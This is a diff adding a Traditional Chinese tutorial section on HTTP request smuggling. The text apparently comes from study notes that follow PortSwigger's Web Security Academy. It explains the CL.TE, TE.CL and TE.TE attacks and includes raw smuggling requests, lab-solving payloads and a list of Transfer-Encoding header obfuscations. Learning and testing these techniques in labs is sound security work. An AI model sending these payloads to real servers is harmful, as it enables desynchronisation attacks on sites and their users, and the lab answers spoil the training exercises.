@@ -95,3 +95,129 @@ q=smuggling
 然而，許多網站有一個支援 HTTP/2 的前端伺服器，但將其部署在僅支援 HTTP/1 的後端基礎設施前面。這意味著前端實際上必須將它接收到的請求翻譯成 HTTP/1。這個過程稱為 HTTP 降級。更多資訊請參見[進階請求走私](https://portswigger.net/web-security/request-smuggling/advanced)。
 :::
 
+## 如何執行 HTTP 請求走私攻擊
+
+經典的請求走私攻擊涉及將 `Content-Length` 標頭和 `Transfer-Encoding` 標頭都放入單個 HTTP/1 請求中，並操縱這些標頭使前端和後端伺服器以不同方式處理請求。具體的執行方式取決於兩個伺服器的行為：
+
+* **CL.TE**：前端伺服器使用 `Content-Length` 標頭，後端伺服器使用 `Transfer-Encoding` 標頭。
+* **TE.CL**：前端伺服器使用 `Transfer-Encoding` 標頭，後端伺服器使用 `Content-Length` 標頭。
+* **TE.TE**：前端和後端伺服器都支援 `Transfer-Encoding` 標頭，但其中一個伺服器可以透過某種方式混淆標頭而被誘導不處理它。
+
+::: info Note
+
+這些技術只能使用 HTTP/1 請求執行。瀏覽器和其他客戶端（包括 Burp）預設使用 HTTP/2 與在 TLS 握手期間明確宣告支援它的伺服器通訊。
+
+因此，當測試支援 HTTP/2 的網站時，您需要在 Burp Repeater 中手動切換協議。您可以從 **Inspector** 面板的 **Request attributes** 區段執行此操作。
+:::
+
+### CL.TE 漏洞
+
+在這裡，前端伺服器使用 `Content-Length` 標頭，後端伺服器使用 `Transfer-Encoding` 標頭。我們可以執行簡單的 HTTP 請求走私攻擊如下：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+前端伺服器處理 `Content-Length` 標頭，並確定請求主體長度為 13 位元組，直到 `SMUGGLED` 的結尾。此請求被轉發到後端伺服器。
+
+後端伺服器處理 `Transfer-Encoding` 標頭，因此將訊息主體視為使用分塊編碼。它處理第一個資料塊，該資料塊被聲明為零長度，因此被視為終止請求。接下來的位元組 `SMUGGLED` 未被處理，後端伺服器會將這些位元組視為序列中下一個請求的開始。
+
+::: tip Lab: [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+
+1. 此 Lab 情境為使用前端和後端兩台伺服器處理請求，前端伺服器不會解析 `Transfer-Encoding`，後端則會。前端伺服器不接受 `GET` 和 `POST` 以外的請求，要想辦法成功向後端發送 `GPOST` 請求以完成此 Lab。
+2. 在 Burp Repeater 頁面的 Request attributes 部分設定使用 HTTP/1 進行請求
+3. 使用以下請求發送兩次，就可以對後端伺服器進行 `GPOST` 請求，完成此 Lab。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    0
+
+    G
+    ```
+:::
+
+### TE.CL 漏洞
+
+在這裡，前端伺服器使用 `Transfer-Encoding` 標頭，後端伺服器使用 `Content-Length` 標頭。我們可以執行簡單的 HTTP 請求走私攻擊如下：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+::: info Note
+
+要使用 Burp Repeater 發送此請求，您首先需要進入 Repeater 選單並確保 "Update Content-Length" 選項未勾選。
+
+您需要在最後的 `0` 後面包含尾隨序列 `\r\n\r\n`。
+:::
+
+前端伺服器處理 `Transfer-Encoding` 標頭，因此將訊息主體視為使用分塊編碼。它處理第一個資料塊，該資料塊被聲明為 8 位元組長，直到 `SMUGGLED` 後面行的開始。它處理第二個資料塊，該資料塊被聲明為零長度，因此被視為終止請求。此請求被轉發到後端伺服器。
+
+後端伺服器處理 `Content-Length` 標頭，並確定請求主體長度為 3 位元組，直到 `8` 後面行的開始。接下來的位元組，從 `SMUGGLED` 開始，未被處理，後端伺服器會將這些位元組視為序列中下一個請求的開始。
+
+::: tip Lab: [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+
+1. 連續發送以下請求兩次，完成此 Lab（注意結尾的 `\r\n` 數量）。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    5b
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 3
+
+    x=1
+    0
+
+    ```
+:::
+
+### TE.TE 行為：混淆 TE 標頭
+
+在這裡，前端和後端伺服器都支援 `Transfer-Encoding` 標頭，但其中一個伺服器可以透過某種方式混淆標頭而被誘導不處理它。
+
+混淆 `Transfer-Encoding` 標頭有無數種潛在方式。例如：
+
+```http
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+這些技術中的每一種都涉及對 HTTP 規範的微妙偏離。實作協議規範的真實世界程式碼很少絕對精確地遵守它，不同的實作容忍規範的不同變化是很常見的。要發現 TE.TE 漏洞，需要找到 `Transfer-Encoding` 標頭的某種變化，使得只有前端或後端伺服器之一處理它，而另一個伺服器忽略它。
+
+根據是前端還是後端伺服器可以被誘導不處理混淆的 `Transfer-Encoding` 標頭，攻擊的其餘部分將採取與已描述的 CL.TE 或 TE.CL 漏洞相同的形式。
